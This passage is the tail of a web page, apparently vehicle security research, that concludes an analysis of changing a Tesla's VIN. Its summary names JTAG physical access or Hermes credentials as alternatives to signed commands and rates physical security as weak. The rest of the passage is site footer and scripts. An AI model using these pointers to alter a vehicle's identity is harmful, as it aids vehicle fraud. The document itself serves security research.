analysis)</li> <li>UDS/ISO-TP diagnostic protocols (CAN layer)</li> </ul> <hr> <p><strong>END OF ANALYSIS</strong></p> <p><strong>Document Status:</strong> âœ… COMPLETE<br> <strong>VIN Change Via Signed Commands:</strong> âŒ NOT POSSIBLE (requires Hermes session)<br> <strong>Alternative Methods:</strong> âœ… JTAG (physical) or Hermes auth (credentials)<br> <strong>Security Impact:</strong> ğŸŸ¡ MEDIUM (good network security, weak physical security)</p> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> <button type=button class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg> Back to top </button> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> </div> <div class=md-social> <a href=https://github.com/talas9/tesla target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "toc.follow", "toc.integrate", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script> <script src=../../assets/javascripts/bundle.79ae519e.min.js></script> </body> </html>